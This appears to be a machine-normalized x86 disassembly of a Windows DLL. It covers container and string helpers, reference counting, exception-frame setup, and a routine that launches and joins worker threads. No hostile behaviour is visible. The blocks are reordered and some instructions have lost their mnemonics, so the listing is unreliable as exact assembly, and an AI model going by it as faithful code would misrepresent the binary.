lea ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0xc ]
mov [ ebp + 0x8 ] 0x0
call sub_10019ba5
push r--data
lea edx [ ebp - 0xc ]
push edx
mov [ ebp - 0xc ] r--data
call sub_1001a898
lea eax [ ecx * 4 ]
push eax
call sub_1001a818
add esp 0x4
test eax eax
jne r-xdata
sub_10003010
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0xc
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn 0x4
cmp ecx 0xccccccc
ja r-xdata
lea ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0xc ]
mov [ ebp + 0x8 ] 0x0
call sub_10019ba5
push r--data
lea edx [ ebp - 0xc ]
push edx
mov [ ebp - 0xc ] r--data
call sub_1001a898
lea eax [ ecx + ecx * 4 ]
add eax eax
add eax eax
push eax
call sub_1001a818
add esp 0x4
test eax eax
jne r-xdata
sub_10003070
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0xc
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn 0x4
cmp ecx 0x1fffffff
ja r-xdata
lea ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0xc ]
mov [ ebp + 0x8 ] 0x0
call sub_10019ba5
push r--data
lea edx [ ebp - 0xc ]
push edx
mov [ ebp - 0xc ] r--data
call sub_1001a898
lea eax [ ecx * 8 ]
push eax
call sub_1001a818
add esp 0x4
test eax eax
jne r-xdata
sub_100030d0
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edi ] ecx
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebp
retn 0x8
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x4 ] ecx
mov [ edi ] edx
pop edi
pop esi
pop ebp
retn 0x8
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ edi + 0x4 ] edx
mov [ edi ] eax
pop edi
pop esi
pop ebp
retn 0x8
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
sub_10003140
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10019ce4
add esp 0x4
sub_10003170
push ebp
mov ebp esp
push 0xffffffff
push sub_1002beb0
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
push 0x10
mov [ ebp - 0x4 ] 0x0
call sub_1001a818
add esp 0x4
test eax eax
je r-xdata
xor eax eax
mov ecx 0x1
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
push eax
push edx
mov ecx esi
call sub_100030d0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_100031eb
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
push 0x0
push 0x0
call sub_1001a898
int3
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push esi
call sub_10019ce4
add esp 0x4
push eax
call sub_1001a3eb
add esp 0x4
sub_10003220
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
push edi
mov edi [ ebp + 0xc ]
sub edi edx
mov ecx ebx
sub ecx edx
sar edi 0x2
sar ecx 0x2
mov eax ecx
mov esi edi
test edi edi
je r-xdata
cmp eax ecx
jge r-xdata
cdq
idiv esi
mov eax esi
mov esi edx
test edx edx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
test eax eax
jle r-xdata
mov edx [ ebp + 0x8 ]
lea edx [ edx + eax * 4 ]
mov [ ebp + 0xc ] edx
nop
mov edx [ esi ]
mov ebx [ ecx ]
mov [ esi ] ebx
mov ebx [ ebp + 0x10 ]
mov [ ecx ] edx
mov edx ebx
sub edx ecx
sar edx 0x2
mov esi ecx
cmp edi edx
jge r-xdata
mov ecx [ ebp + 0x8 ]
lea esp [ esp ]
mov ecx edi
sub ecx edx
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
lea edx [ edi * 4 ]
add ecx edx
jmp r-xdata
dec eax
sub edx 0x4
mov [ ebp + 0xc ] edx
test eax eax
jg r-xdata
mov edx [ ebp + 0xc ]
cmp ecx edx
jne r-xdata
lea ecx [ edx + edi * 4 ]
mov esi edx
cmp ecx ebx
jne r-xdata
sub_100032c0
push esi
mov esi ecx
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
pop esi
retn
mov eax [ esi ]
push eax
call sub_10019ce4
add esp 0x4
sub_100032f0
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
pop esi
retn
push eax
call sub_10019ce4
add esp 0x4
sub_10003320
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0xc ]
mov edx [ esi + 0x4 ]
lea eax [ ecx + 0x4 ]
sub edx eax
sar edx 0x2
add edx edx
add edx edx
push edx
push eax
push ecx
call sub_1001a060
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
add esp 0xc
add [ esi + 0x4 ] 0xfffffffc
mov [ eax ] ecx
pop esi
pop ebp
retn 0x8
sub_10003360
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
cmp eax 0x3fffffff
jbe r-xdata
mov ecx [ esi + 0x8 ]
sub ecx [ esi ]
sar ecx 0x2
cmp ecx eax
jae r-xdata
push r--data
call sub_100190f4
pop esi
pop ebp
retn 0x4
push ebx
push edi
push eax
lea ecx [ esi + 0xc ]
call sub_10002fb0
mov edx [ esi + 0x4 ]
mov ebx eax
mov eax [ esi ]
sub edx eax
sar edx 0x2
add edx edx
add edx edx
push edx
push eax
push ebx
call sub_1001a060
mov eax [ esi ]
mov edi [ esi + 0x4 ]
sub edi eax
add esp 0xc
sar edi 0x2
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebx + edi * 4 ]
lea ecx [ ebx + eax * 4 ]
pop edi
mov [ esi ] ebx
mov [ esi + 0x8 ] ecx
mov [ esi + 0x4 ] edx
pop ebx
push eax
call sub_10019ce4
add esp 0x4
sub_100033e0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push edi
mov edi [ eax + 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x4 ] ecx
mov [ ebp + 0x8 ] eax
test edi edi
je r-xdata
pop edi
mov esp ebp
pop ebp
retn 0x4
mov edx [ edi + 0x4 ]
push esi
test edx edx
je r-xdata
pop esi
push ebx
mov edx [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
push edi
push edx
call sub_100030d0
pop ebx
mov edx [ edi + 0x4 ]
test edx edx
jne r-xdata
lea ecx [ edx + 0x1 ]
lea ebx [ edi + 0x4 ]
mov eax edx
[ ebx ] ecx
cmp eax edx
je r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn 0x4
sub_10003440
push ebp
mov ebp esp
push 0xffffffff
push sub_1002bed0
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
push 0x10
mov [ ebp - 0x4 ] 0x0
call sub_1001a818
add esp 0x4
test eax eax
je r-xdata
xor eax eax
mov ecx 0x1
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
push eax
push edx
mov ecx esi
call sub_100030d0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_100034bb
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
push 0x0
push 0x0
call sub_1001a898
int3
mov eax [ esi ]
push eax
call sub_1001a3eb
push esi
call sub_10019ce4
add esp 0x8
sub_100034e0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push edi
mov esi ecx
test eax eax
je r-xdata
mov edi [ ebp + 0xc ]
cmp edi 0x7ffffffe
jbe r-xdata
mov edx [ esi + 0x14 ]
cmp edx 0x8
jb r-xdata
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
push r--data
call sub_100190f4
cmp eax ecx
jb r-xdata
mov ecx [ esi ]
test edi edi
jne r-xdata
mov eax [ esi + 0x10 ]
push eax
push edi
mov ecx esi
call sub_100014e0
test edi edi
je r-xdata
cmp edx 0x8
jb r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x8
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
xor ecx ecx
pop edi
mov [ eax ] cx
pop esi
pop ebp
retn 0x8
mov eax [ esi ]
xor ecx ecx
mov [ eax ] cx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
cmp edx 0x8
jb r-xdata
mov edi [ esi + 0x10 ]
lea ecx [ ecx + edi * 2 ]
cmp ecx eax
jbe r-xdata
mov eax esi
xor ecx ecx
mov [ ebx + eax ] cx
pop ebx
mov eax [ esi ]
xor ecx ecx
mov [ ebx + eax ] cx
pop ebx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov edx [ ebp + 0x8 ]
push ebx
lea ebx [ edi + edi ]
push ebx
push edx
push eax
call sub_10019cf0
add esp 0xc
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov edx [ ebp + 0xc ]
sub eax ecx
push edx
sar eax 0x1
push eax
push esi
mov ecx esi
call sub_100019e0
pop edi
pop esi
pop ebp
retn 0x8
sub_100035d0
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ esi + 0x8 ]
cmp eax ecx
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx [ esi ]
sub eax edx
sar eax 0x2
cmp eax 0x3ffffffe
jbe r-xdata
add [ esi + 0x4 ] 0x4
pop esi
pop ebp
retn 0x4
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ eax ] edx
sub ecx edx
inc eax
sar ecx 0x2
cmp eax ecx
jbe r-xdata
push r--data
call sub_100190f4
push edi
mov edx ecx
shr edx 0x1
mov edi 0x3fffffff
sub edi edx
cmp edi ecx
pop edi
jae r-xdata
add ecx edx
xor ecx ecx
jmp r-xdata
push ecx
mov ecx esi
call sub_10003360
mov ecx eax
cmp ecx eax
jae r-xdata
sub_10003640
push ebp
mov ebp esp
push 0xffffffff
push sub_1002bf00
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ esi + 0x10 ]
mov eax [ ecx ]
mov edx [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
xor edi edi
push edx
mov [ ebp - 0x4 ] edi
call eax
push eax
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] edi
call sub_10003170
mov ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x1
cmp ecx edi
jne r-xdata
mov eax [ ecx ]
mov edx [ esi + 0x38 ]
cmp eax [ edx ]
je r-xdata
mov esi [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0x0
cmp esi edi
je r-xdata
mov eax [ esi + 0x24 ]
mov edx [ esi + 0x28 ]
sub edx eax
sar edx 0x2
mov [ ebp - 0xd ] 0x0
test edx edx
je r-xdata
mov al [ esi + 0x34 ]
cmp al 0xff
je r-xdata
mov esi [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0xffffffff
cmp esi edi
je r-xdata
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov esi [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0x0
cmp esi edi
je r-xdata
jmp r-xdata
mov ecx [ esi + 0x24 ]
movzx eax al
mov esi [ ecx + eax * 4 ]
sub esp 0x8
mov ecx esp
lea edx [ ebp - 0x1c ]
mov [ ebp - 0x14 ] esp
push edx
mov [ ecx ] edi
mov [ ecx + 0x4 ] edi
call sub_100033e0
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov esi [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0xffffffff
cmp esi edi
je r-xdata
lea edx [ esi + 0x4 ]
or eax 0xffffffff
[ edx ] eax
jne r-xdata
mov eax [ eax + edi * 4 ]
movzx ebx [ ecx + 0x4 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0xc ]
call eax
cmp ax bx
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov cl [ ebp - 0xd ]
mov eax [ esi + 0x24 ]
inc cl
movzx edi cl
mov [ ebp - 0xd ] cl
mov ecx [ esi + 0x28 ]
sub ecx eax
sar ecx 0x2
cmp edi ecx
jb r-xdata
mov ecx [ esi + 0x24 ]
mov edi [ ecx + edi * 4 ]
sub esp 0x8
mov ecx esp
lea edx [ ebp - 0x1c ]
mov [ ebp - 0x14 ] esp
push edx
mov [ ecx ] 0x0
mov [ ecx + 0x4 ] 0x0
call sub_100033e0
mov eax [ edi ]
mov edx [ eax ]
mov ecx edi
call edx
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
mov ecx [ ebp - 0x1c ]
xor edi edi
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
sub_10003860
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp esi edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
cmp [ edi + 0x14 ] 0x8
jae r-xdata
mov eax [ esi ]
push eax
call sub_10019ce4
add esp 0x4
mov ecx [ edi ]
mov [ esi ] ecx
mov [ edi ] 0x0
mov edx [ edi + 0x10 ]
lea eax [ edx + edx + 0x2 ]
push eax
push edi
push esi
call sub_1001a060
add esp 0xc
jmp r-xdata
mov edx [ edi + 0x10 ]
mov [ esi + 0x10 ] edx
mov eax [ edi + 0x14 ]
mov [ esi + 0x14 ] eax
mov [ edi + 0x10 ] 0x0
mov [ edi + 0x14 ] 0x0
sub_10003900
push ebp
mov ebp esp
mov eax [ ecx + 0x3c ]
sub eax [ ecx + 0x38 ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
lea esi [ ecx + 0x38 ]
sar eax 0x2
xor dl dl
push edi
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
lea ecx [ ebp + 0x8 ]
cmp ecx eax
jae r-xdata
mov edi [ esi ]
xor ecx ecx
nop
mov ecx [ esi + 0x8 ]
cmp eax ecx
jne r-xdata
mov edx [ esi ]
cmp edx ecx
ja r-xdata
pop edi
pop esi
xor al al
pop ebx
pop ebp
retn 0x4
inc dl
movzx ecx dl
cmp ecx eax
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx [ esi ]
sub eax edx
sar eax 0x2
cmp eax 0x3ffffffe
jbe r-xdata
mov edi ecx
mov ecx [ esi + 0x8 ]
sub edi edx
sar edi 0x2
cmp eax ecx
jne r-xdata
cmp [ edi + ecx * 4 ] ebx
je r-xdata
add [ esi + 0x4 ] 0x4
mov edi [ esi ]
mov eax [ esi + 0x4 ]
cmp edi eax
jae r-xdata
mov [ eax ] ebx
sub ecx edx
inc eax
sar ecx 0x2
cmp eax ecx
jbe r-xdata
push r--data
call sub_100190f4
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
sub eax edx
sar eax 0x2
cmp eax 0x3ffffffe
jbe r-xdata
mov ecx [ esi + 0x8 ]
cmp eax ecx
jne r-xdata
mov edx edi
cmp edx edi
ja r-xdata
mov edx ecx
shr edx 0x1
mov edi 0x3fffffff
sub edi edx
cmp edi ecx
jae r-xdata
mov edx [ esi ]
mov ecx [ edx + edi * 4 ]
mov [ eax ] ecx
jmp r-xdata
sub ecx edx
inc eax
sar ecx 0x2
cmp eax ecx
jbe r-xdata
push r--data
call sub_100190f4
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx edi
sub eax edx
sar eax 0x2
cmp eax 0x3ffffffe
jbe r-xdata
mov ecx [ esi + 0x8 ]
sub edi edx
sar edi 0x2
cmp eax ecx
jne r-xdata
add ecx edx
xor ecx ecx
jmp r-xdata
mov edx ecx
shr edx 0x1
mov ebx 0x3fffffff
sub ebx edx
cmp ebx ecx
jae r-xdata
add [ esi + 0x4 ] 0x4
pop edi
pop esi
mov al 0x1
pop ebx
pop ebp
retn 0x4
mov edx [ edi ]
mov [ eax ] edx
sub ecx edx
inc eax
sar ecx 0x2
cmp eax ecx
jbe r-xdata
push r--data
call sub_100190f4
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
sub eax edx
sar eax 0x2
cmp eax 0x3ffffffe
jbe r-xdata
push ecx
mov ecx esi
call sub_10003360
mov ecx eax
cmp ecx eax
jae r-xdata
add ecx edx
xor ecx ecx
jmp r-xdata
mov edx ecx
shr edx 0x1
mov ebx 0x3fffffff
sub ebx edx
cmp ebx ecx
jae r-xdata
mov edx [ esi ]
mov ecx [ edx + edi * 4 ]
mov [ eax ] ecx
add [ esi + 0x4 ] 0x4
pop edi
pop esi
mov al 0x1
pop ebx
pop ebp
retn 0x4
sub ecx edx
inc eax
sar ecx 0x2
cmp eax ecx
jbe r-xdata
push r--data
call sub_100190f4
push ecx
mov ecx esi
call sub_10003360
mov ecx eax
cmp ecx eax
jae r-xdata
add ecx edx
xor ecx ecx
jmp r-xdata
mov edx ecx
shr edx 0x1
mov ebx 0x3fffffff
sub ebx edx
cmp ebx ecx
jae r-xdata
push ecx
mov ecx esi
call sub_10003360
mov ecx eax
cmp ecx eax
jae r-xdata
add ecx edx
xor ecx ecx
jmp r-xdata
push ecx
mov ecx esi
call sub_10003360
mov ecx eax
cmp ecx eax
jae r-xdata
sub_10003ae0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
mov esi ecx
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
mov eax edx
push edi
lea edi [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edi
sar eax 0x1
push eax
push edx
mov ecx esi
call sub_100034e0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10003b30
push ebp
mov ebp esp
sub esp 0x8
push esi
mov esi [ ebp + 0x8 ]
cmp esi [ ebp + 0xc ]
je r-xdata
mov eax [ ebp + 0x10 ]
pop esi
mov esp ebp
pop ebp
retn
push ebx
mov ebx [ ebp + 0x10 ]
push edi
mov edi [ ebx + 0x4 ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] ecx
test edi edi
je r-xdata
mov eax [ esi + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
mov [ esi ] 0x0
add esi 0x8
add ebx 0x8
cmp esi [ ebp + 0xc ]
jne r-xdata
lea eax [ edi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
lea edx [ ebp - 0x8 ]
xor ecx ecx
xor eax eax
cmp edx esi
je r-xdata
pop edi
mov eax ebx
pop ebx
pop esi
mov esp ebp
pop ebp
retn
mov edx [ edi ]
mov eax [ edx ]
mov ecx edi
call eax
lea ecx [ edi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ edi ]
mov edx [ eax + 0x4 ]
mov ecx edi
call edx
sub_10003bb0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
cmp eax ebx
je r-xdata
pop ebx
pop ebp
retn
push esi
push edi
lea edi [ eax + 0x4 ]
add edi 0x8
lea eax [ edi - 0x4 ]
cmp eax ebx
jne r-xdata
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov esi [ edi ]
test esi esi
je r-xdata
pop edi
pop esi
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
sub_10003c10
push ebp
mov ebp esp
push 0xffffffff
push sub_1002bf28
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov eax [ esi + 0x38 ]
mov edx [ eax ]
mov [ ecx ] edx
mov edx [ esi + 0x38 ]
cmp eax [ edx ]
je r-xdata
sub esp 0x8
mov ecx esp
lea edx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] esp
push edx
mov [ ecx ] 0x0
mov [ ecx + 0x4 ] 0x0
call sub_100033e0
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
mov esi [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0xffffffff
test esi esi
je r-xdata
cmp al 0x34
je r-xdata
push eax
mov ecx esi
call sub_10003900
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x8
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
cmp al 0x35
je r-xdata
mov edx [ ebp + 0x8 ]
mov al [ edx + 0x6 ]
cmp al 0x33
je r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
cmp al 0x36
je r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
mov ecx [ esi + 0x10 ]
mov eax [ ecx ]
push edx
mov edx [ eax + 0x4 ]
call edx
mov ecx [ ebp + 0x8 ]
mov cl [ ecx + 0x7 ]
sub esp 0x8
cmp cl [ rw-data ]
mov [ ebp - 0x10 ] esp
mov ecx esp
push eax
jne r-xdata
call sub_10001910
mov ecx [ esi + 0x18 ]
mov edx [ ecx ]
mov eax [ edx + 0xc ]
call sub_10001910
mov ecx [ esi + 0x18 ]
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
jmp r-xdata
call eax
lea ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_100132b0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x8
sub_10003d50
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov ecx [ edi + 0x20 ]
mov eax [ ecx ]
mov edx [ eax ]
call edx
mov ebx [ edi + 0x38 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
sub ebx ebx
push eax
lea ecx [ edi + 0x38 ]
sar ebx 0x2
call sub_100035d0
mov eax [ edi + 0x3c ]
mov esi [ edi + 0x38 ]
lea edx [ esi + ebx * 4 ]
lea ecx [ eax - 0x4 ]
xor ebx ebx
cmp edx ecx
je r-xdata
mov ecx [ rw-data ]
push ecx
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x4 ] esp
mov [ edi + 0x48 ] bl
push ebx
mov esi 0x7
xor edx edx
mov [ ecx + 0x14 ] esi
mov [ ecx + 0x10 ] ebx
push r--data
mov [ ecx ] dx
call sub_100034e0
mov ecx [ edi + 0x1c ]
mov eax [ ecx ]
mov edx [ eax ]
call edx
cmp eax ebx
je r-xdata
cmp ecx eax
je r-xdata
mov eax [ rw-data ]
push eax
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x4 ] esp
push ebx
xor edx edx
mov [ ecx + 0x14 ] esi
mov [ ecx + 0x10 ] ebx
push r--data
mov [ ecx ] dx
call sub_100034e0
mov ecx [ edi + 0x1c ]
mov eax [ ecx ]
mov edx [ eax ]
call edx
cmp eax ebx
je r-xdata
mov [ edi + 0x5c ] eax
push ebx
push ebx
push eax
push ecx
push edx
call sub_10003220
add esp 0x14
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ edi + 0x60 ] eax
sub_10003e20
push ebp
mov ebp esp
push 0xffffffff
push sub_1002daab
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x18 ] edi
push 0x18
call sub_1001a818
add esp 0x4
mov [ ebp - 0x1c ] eax
xor ebx ebx
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
mov ecx ebx
mov [ ebp - 0x4 ] 0xffffffff
call j_sub_100127b0
mov ecx [ edi + 0x20 ]
mov esi eax
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
push esi
call edx
test al al
je r-xdata
push 0xc
push rw-data
push 0x50
push rw-data
mov ecx eax
call sub_10012710
mov ebx eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
je r-xdata
push esi
call sub_1001a3eb
add esp 0x4
mov ecx edi
call sub_10003d50
mov ecx [ edi + 0xc ]
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
call edx
mov esi [ edi + 0x28 ]
sub esi [ edi + 0x24 ]
xor ecx ecx
sar esi 0x2
mov eax esi
mov edx 0x4
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_100191af
mov ebx eax
xor ecx ecx
mov eax esi
mov edx 0x4
mul edx
seto cl
mov [ ebp - 0x10 ] ebx
neg ecx
or ecx eax
push ecx
call sub_100191af
add esp 0x8
xor edi edi
mov [ ebp - 0x1c ] eax
test esi esi
je r-xdata
mov ecx ebx
call sub_10012740
push ebx
call sub_10019ce4
add esp 0x4
mov ecx [ ebx ]
push 0xffffffff
push ecx
call [ WaitForSingleObject@IAT ]
xor edi edi
test esi esi
je r-xdata
mov ecx eax
sub ecx ebx
mov [ ebp - 0x14 ] ecx
jmp r-xdata
push ebx
call sub_1001a8e4
mov eax [ ebp - 0x1c ]
push eax
call sub_1001a8e4
add esp 0x8
mov edx [ ebx + edi * 4 ]
push edx
call [ CloseHandle@IAT ]
inc edi
cmp edi esi
jb r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ eax + 0x24 ]
add ecx ebx
push ecx
lea eax [ edx + edi * 4 ]
mov eax [ eax ]
push 0x0
push eax
push sub_10002e50
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov [ ebx ] eax
inc edi
add ebx 0x4
cmp edi esi
jb r-xdata
mov ecx [ ebp - 0x14 ]
